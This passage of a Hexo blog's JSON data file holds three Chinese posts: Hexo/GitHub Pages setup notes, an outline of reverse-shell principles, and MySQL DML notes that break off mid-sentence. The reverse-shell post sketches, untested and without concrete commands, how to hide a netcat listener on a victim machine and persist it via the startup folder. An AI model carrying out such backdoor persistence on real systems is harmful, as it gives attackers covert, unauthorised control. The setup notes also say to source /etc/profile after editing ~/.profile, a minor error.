hexo发生error:spawn failed错误的解决方法\n\n- [原文链接](https://blog.csdn.net/HTL2018/article/details/106876940)\n- 问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容\n\n```\n# 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n\thexo clean\n\thexo g\n\thexo d\n\n```\n\n","source":"_posts/博客搭建.md","raw":"---\ntitle: 搭建博客\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_9.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: blog \ntags: [blog]   # 可以是数组\ntop: false\n---\n\n# 搭建静态页面个人博客\n\n[参考文献](https://www.jianshu.com/p/189fd945f38f)\n\n[参考文献]()\n\n### 安装hexo\n\n1. 检查电脑是否有node.js\n\n   ```\n   node -v\n   ```\n   <!--more-->\n\n2. 若没有则下载\n\n3. 安装npm\n\n   ```\n   npm install -g hexo-cli\n   这样会报错\n   ```\n\n   \n\n\n\n### 解决错误：\n\nMissing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.\n在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):\n\n```\nmkdir ~/.npm-global\n```\n\n\n\n设置npm全局包的安装路径:\n\n```\nnpm config set prefix '~/.npm-global'\n```\n\n\n\n在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:\n\n```\nexport PATH=~/.npm-global/bin:$PATH\n```\n\n\n\n回到终端运行以下命令, 让配置生效:\n\n```\nsource /etc/profile\n```\n\n\n\n然后全局安装npm包就可以了.\n\n[原文链[接](https://blog.csdn.net/zhangxuekang/article/details/89075039)\n\n\n2. 将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：\n\n   echo 'PATH=\"$PATH:./node_modules/.bin\"' >> ~/.profile\n\n2. 初始化博客框架\n\n\n```\n# 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server\n```\n\n\n\n### 主题切换\n\n1. 去hexo官网下载主题，克隆到自己的仓库下\n\n2. 配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题\n\n   并且更改语言设置成zh-CN\n\n3. 在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内\n\n### 博客与github挂钩\n\n1. 在github上新建一个仓库，仓库名为    自己的github名.github.io\n\n2. 在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：\n\n   ```\n   deploy:\n   \ttype: git\n   \trepo: 仓库名称.git  (.git不能少)\n   \tbranch： master\n   ```\n\n3. 安装git部署插件\n\n   ```\n   npm install hexo-deployer-git --save\n   ```\n\n4. 之后\n\n   ```\n   npx hexo clean\n   npx hexo g\n   # 进行网站部署\n   npx hexo d\n   ```\n\n5. 大功告成\n\n## 绑定域名\n\n1. 先去购买域名\n\n2. 进行域名注册\n\n3. 再进行域名解析（必要的环节）\n\n   + 进入解析页面\n   + 添加解析\n   + 在命令行下ping自己的github和博客绑定的仓库\n   + 得到ip地址之后添加到解析列表\n\n4. 进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名\n\n5. 进入blog，依次输入\n\n   \n\n   ```\n   npx hexo clean\n   npx hexo g\n   hexo d\n   ```\n\n6. 大功告成.\n\n\n\n### hexo发生error:spawn failed错误的解决方法\n\n- [原文链接](https://blog.csdn.net/HTL2018/article/details/106876940)\n- 问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容\n\n```\n# 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n\thexo clean\n\thexo g\n\thexo d\n\n```\n\n","slug":"博客搭建","published":1,"updated":"2021-06-20T02:57:13.606Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzay1000u7vvt5qgi95uc","content":"<h1 id=\"搭建静态页面个人博客\"><a href=\"#搭建静态页面个人博客\" class=\"headerlink\" title=\"搭建静态页面个人博客\"></a>搭建静态页面个人博客</h1><p><a href=\"https://www.jianshu.com/p/189fd945f38f\">参考文献</a></p>\n<p><a href=\"\">参考文献</a></p>\n<h3 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h3><ol>\n<li><p>检查电脑是否有node.js</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node -v</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span></li>\n<li><p>若没有则下载</p>\n</li>\n<li><p>安装npm</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli</span><br><span class=\"line\">这样会报错</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"解决错误：\"><a href=\"#解决错误：\" class=\"headerlink\" title=\"解决错误：\"></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/.npm-global</span><br></pre></td></tr></table></figure>\n\n\n\n<p>设置npm全局包的安装路径:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix &#x27;~/.npm-global&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=~/.npm-global/bin:$PATH</span><br></pre></td></tr></table></figure>\n\n\n\n<p>回到终端运行以下命令, 让配置生效:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后全局安装npm包就可以了.</p>\n<p>[原文链<a href=\"https://blog.csdn.net/zhangxuekang/article/details/89075039\">接</a></p>\n<ol start=\"2\">\n<li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p>\n<p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p>\n</li>\n<li><p>初始化博客框架</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 选择一个地方新建博客目录</span><br><span class=\"line\">npx hexo init blog</span><br><span class=\"line\"></span><br><span class=\"line\"># 生成博客文件夹中的moudle文件夹</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\"></span><br><span class=\"line\"># 进行本机器运行测试</span><br><span class=\"line\">npx hexo server</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"主题切换\"><a href=\"#主题切换\" class=\"headerlink\" title=\"主题切换\"></a>主题切换</h3><ol>\n<li><p>去hexo官网下载主题，克隆到自己的仓库下</p>\n</li>\n<li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p>\n<p>并且更改语言设置成zh-CN</p>\n</li>\n<li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p>\n</li>\n</ol>\n<h3 id=\"博客与github挂钩\"><a href=\"#博客与github挂钩\" class=\"headerlink\" title=\"博客与github挂钩\"></a>博客与github挂钩</h3><ol>\n<li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p>\n</li>\n<li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">\ttype: git</span><br><span class=\"line\">\trepo: 仓库名称.git  (.git不能少)</span><br><span class=\"line\">\tbranch： master</span><br></pre></td></tr></table></figure></li>\n<li><p>安装git部署插件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>\n<li><p>之后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx hexo clean</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\"># 进行网站部署</span><br><span class=\"line\">npx hexo d</span><br></pre></td></tr></table></figure></li>\n<li><p>大功告成</p>\n</li>\n</ol>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><ol>\n<li><p>先去购买域名</p>\n</li>\n<li><p>进行域名注册</p>\n</li>\n<li><p>再进行域名解析（必要的环节）</p>\n<ul>\n<li>进入解析页面</li>\n<li>添加解析</li>\n<li>在命令行下ping自己的github和博客绑定的仓库</li>\n<li>得到ip地址之后添加到解析列表</li>\n</ul>\n</li>\n<li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p>\n</li>\n<li><p>进入blog，依次输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx hexo clean</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure></li>\n<li><p>大功告成.</p>\n</li>\n</ol>\n<h3 id=\"hexo发生error-spawn-failed错误的解决方法\"><a href=\"#hexo发生error-spawn-failed错误的解决方法\" class=\"headerlink\" title=\"hexo发生error:spawn failed错误的解决方法\"></a>hexo发生error:spawn failed错误的解决方法</h3><ul>\n<li><a href=\"https://blog.csdn.net/HTL2018/article/details/106876940\">原文链接</a></li>\n<li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 出现错误</span><br><span class=\"line\">error:spawn failed...</span><br><span class=\"line\">#解决方法</span><br><span class=\"line\">1. 删除blog文件夹中的 .deploy_git 文件夹</span><br><span class=\"line\">2. 输入 git config --global core.autocrlf false</span><br><span class=\"line\">3. </span><br><span class=\"line\">\thexo clean</span><br><span class=\"line\">\thexo g</span><br><span class=\"line\">\thexo d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h1 id=\"搭建静态页面个人博客\"><a href=\"#搭建静态页面个人博客\" class=\"headerlink\" title=\"搭建静态页面个人博客\"></a>搭建静态页面个人博客</h1><p><a href=\"https://www.jianshu.com/p/189fd945f38f\">参考文献</a></p>\n<p><a href=\"\">参考文献</a></p>\n<h3 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h3><ol>\n<li><p>检查电脑是否有node.js</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node -v</span><br></pre></td></tr></table></figure>","more":"</li>\n<li><p>若没有则下载</p>\n</li>\n<li><p>安装npm</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli</span><br><span class=\"line\">这样会报错</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"解决错误：\"><a href=\"#解决错误：\" class=\"headerlink\" title=\"解决错误：\"></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/.npm-global</span><br></pre></td></tr></table></figure>\n\n\n\n<p>设置npm全局包的安装路径:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix &#x27;~/.npm-global&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=~/.npm-global/bin:$PATH</span><br></pre></td></tr></table></figure>\n\n\n\n<p>回到终端运行以下命令, 让配置生效:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后全局安装npm包就可以了.</p>\n<p>[原文链<a href=\"https://blog.csdn.net/zhangxuekang/article/details/89075039\">接</a></p>\n<ol start=\"2\">\n<li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p>\n<p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p>\n</li>\n<li><p>初始化博客框架</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 选择一个地方新建博客目录</span><br><span class=\"line\">npx hexo init blog</span><br><span class=\"line\"></span><br><span class=\"line\"># 生成博客文件夹中的moudle文件夹</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\"></span><br><span class=\"line\"># 进行本机器运行测试</span><br><span class=\"line\">npx hexo server</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"主题切换\"><a href=\"#主题切换\" class=\"headerlink\" title=\"主题切换\"></a>主题切换</h3><ol>\n<li><p>去hexo官网下载主题，克隆到自己的仓库下</p>\n</li>\n<li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p>\n<p>并且更改语言设置成zh-CN</p>\n</li>\n<li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p>\n</li>\n</ol>\n<h3 id=\"博客与github挂钩\"><a href=\"#博客与github挂钩\" class=\"headerlink\" title=\"博客与github挂钩\"></a>博客与github挂钩</h3><ol>\n<li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p>\n</li>\n<li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">\ttype: git</span><br><span class=\"line\">\trepo: 仓库名称.git  (.git不能少)</span><br><span class=\"line\">\tbranch： master</span><br></pre></td></tr></table></figure></li>\n<li><p>安装git部署插件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>\n<li><p>之后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx hexo clean</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\"># 进行网站部署</span><br><span class=\"line\">npx hexo d</span><br></pre></td></tr></table></figure></li>\n<li><p>大功告成</p>\n</li>\n</ol>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><ol>\n<li><p>先去购买域名</p>\n</li>\n<li><p>进行域名注册</p>\n</li>\n<li><p>再进行域名解析（必要的环节）</p>\n<ul>\n<li>进入解析页面</li>\n<li>添加解析</li>\n<li>在命令行下ping自己的github和博客绑定的仓库</li>\n<li>得到ip地址之后添加到解析列表</li>\n</ul>\n</li>\n<li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p>\n</li>\n<li><p>进入blog，依次输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx hexo clean</span><br><span class=\"line\">npx hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure></li>\n<li><p>大功告成.</p>\n</li>\n</ol>\n<h3 id=\"hexo发生error-spawn-failed错误的解决方法\"><a href=\"#hexo发生error-spawn-failed错误的解决方法\" class=\"headerlink\" title=\"hexo发生error:spawn failed错误的解决方法\"></a>hexo发生error:spawn failed错误的解决方法</h3><ul>\n<li><a href=\"https://blog.csdn.net/HTL2018/article/details/106876940\">原文链接</a></li>\n<li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 出现错误</span><br><span class=\"line\">error:spawn failed...</span><br><span class=\"line\">#解决方法</span><br><span class=\"line\">1. 删除blog文件夹中的 .deploy_git 文件夹</span><br><span class=\"line\">2. 输入 git config --global core.autocrlf false</span><br><span class=\"line\">3. </span><br><span class=\"line\">\thexo clean</span><br><span class=\"line\">\thexo g</span><br><span class=\"line\">\thexo d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"反弹shell","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_11.jpg","top":false,"_content":"\n# 反弹shell原理\n\n[相关原文链接](https://www.cnblogs.com/iouwenbo/p/11277453.html)\n\n## 反弹shell定义\n\n<!--more-->\n\n- 正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh\n- 所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器\n- 本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统\n\n## 反弹应用情景\n\n1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。\n2. 目标机器的ip动态改变，你不能持续控制。\n3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求\n4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。\n\n## 利用netcat进行反弹shell思路\n\n- 注：只是想法，本人还未进行实践，未知可行性\n\n1. 在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）\n2. 将建立好的服务器放置于目标机器的开机自启文件夹中\n3. 在自己的机器上建立客户端，这样随时就可以访问了\n\n","source":"_posts/反弹shell原理.md","raw":"---\ntitle: 反弹shell\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_11.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: shell\ntags: [shell, necat]   # 可以是数组\ntop: false\n---\n\n# 反弹shell原理\n\n[相关原文链接](https://www.cnblogs.com/iouwenbo/p/11277453.html)\n\n## 反弹shell定义\n\n<!--more-->\n\n- 正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh\n- 所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器\n- 本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统\n\n## 反弹应用情景\n\n1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。\n2. 目标机器的ip动态改变，你不能持续控制。\n3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求\n4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。\n\n## 利用netcat进行反弹shell思路\n\n- 注：只是想法，本人还未进行实践，未知可行性\n\n1. 在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）\n2. 将建立好的服务器放置于目标机器的开机自启文件夹中\n3. 在自己的机器上建立客户端，这样随时就可以访问了\n\n","slug":"反弹shell原理","published":1,"updated":"2021-06-20T02:59:30.234Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzay2000w7vvt5yoi5qlq","content":"<h1 id=\"反弹shell原理\"><a href=\"#反弹shell原理\" class=\"headerlink\" title=\"反弹shell原理\"></a>反弹shell原理</h1><p><a href=\"https://www.cnblogs.com/iouwenbo/p/11277453.html\">相关原文链接</a></p>\n<h2 id=\"反弹shell定义\"><a href=\"#反弹shell定义\" class=\"headerlink\" title=\"反弹shell定义\"></a>反弹shell定义</h2><span id=\"more\"></span>\n\n<ul>\n<li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li>\n<li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li>\n<li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li>\n</ul>\n<h2 id=\"反弹应用情景\"><a href=\"#反弹应用情景\" class=\"headerlink\" title=\"反弹应用情景\"></a>反弹应用情景</h2><ol>\n<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>\n<li>目标机器的ip动态改变，你不能持续控制。</li>\n<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>\n</ol>\n<h2 id=\"利用netcat进行反弹shell思路\"><a href=\"#利用netcat进行反弹shell思路\" class=\"headerlink\" title=\"利用netcat进行反弹shell思路\"></a>利用netcat进行反弹shell思路</h2><ul>\n<li>注：只是想法，本人还未进行实践，未知可行性</li>\n</ul>\n<ol>\n<li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li>\n<li>将建立好的服务器放置于目标机器的开机自启文件夹中</li>\n<li>在自己的机器上建立客户端，这样随时就可以访问了</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"反弹shell原理\"><a href=\"#反弹shell原理\" class=\"headerlink\" title=\"反弹shell原理\"></a>反弹shell原理</h1><p><a href=\"https://www.cnblogs.com/iouwenbo/p/11277453.html\">相关原文链接</a></p>\n<h2 id=\"反弹shell定义\"><a href=\"#反弹shell定义\" class=\"headerlink\" title=\"反弹shell定义\"></a>反弹shell定义</h2>","more":"<ul>\n<li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li>\n<li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li>\n<li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li>\n</ul>\n<h2 id=\"反弹应用情景\"><a href=\"#反弹应用情景\" class=\"headerlink\" title=\"反弹应用情景\"></a>反弹应用情景</h2><ol>\n<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>\n<li>目标机器的ip动态改变，你不能持续控制。</li>\n<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>\n</ol>\n<h2 id=\"利用netcat进行反弹shell思路\"><a href=\"#利用netcat进行反弹shell思路\" class=\"headerlink\" title=\"利用netcat进行反弹shell思路\"></a>利用netcat进行反弹shell思路</h2><ul>\n<li>注：只是想法，本人还未进行实践，未知可行性</li>\n</ul>\n<ol>\n<li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li>\n<li>将建立好的服务器放置于目标机器的开机自启文件夹中</li>\n<li>在自己的机器上建立客户端，这样随时就可以访问了</li>\n</ol>"},{"title":"MYSQL(二)","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_15.jpg","top":false,"_content":"\n# 数据库（二）\n\n[参考的相关视频资料连接](https://www.bilibili.com/video/BV12b411K7Zu/?p=105)\n\n## DML语言\n\n- 数据操作语言：\n  - 插入：insert\n  - 修改：update\n  - 删除：delete\n\n### 插入语句\n\n#### 方式一：经典插入语句\n\n<!--more-->\n\n- 语法\n\n```\ninsert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;\n```\n\n- 注意事项：\n  1. 插入的值的类型与列的类型一致或兼容\n  2. 可以为NULL的列可以插入NULL值，不为NULL的列必须插入值\n  3. 列的顺序可以调换，但是插入的值必须和列相匹配\n  4. 列数和值得个数必须相一致\n  5. 可以省略列名，默认所有列，而且列的顺序和表中的顺序一致\n\n```\ninsert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列\n```\n\n#### 方式二：\n\n1. 语法：\n\n```\ninsert into 表名\nset 列名1=值1，列名2=值2，...\n```\n\n2. 案例:\n\n```\ninsert into beauty\nset id=19, name='章子怡'，phone='110';\n```\n\n#### 注意事项\n\n1. 方式一支持插入多行，方式二不行\n2. 方式一支持子查询，方式二不行\n\n\n\n### 修改语句\n\n#### 修改单表的记录（*重点）\n\n1. 语法：\n\n```\nupdate 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；\n```\n\n2. 案例：修改boys表中id号位2的名称为张飞，魅力值10\n\n```\nupdate boys set boyname='张飞'， usercp=10\nwhere id=2;\n```\n\n#### 修改多表得记录(了解即可)\n\n1. 语法：\n\n```\nsql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...\n```\n\n\n\n### 删除语句\n\n1. 方式一：delete \n\n- 删除整行\n- 单表的删除\n\n```\n语法：\ndelete from 表名 where 筛选条件\n```\n\n- 案例：删除手机号以3结尾的女孩信息\n\n```\ndelete from girls \nwhere phon like '%3';\n```\n\n2. 方式二：truncate\n\n```\n语法：\ntruncate table 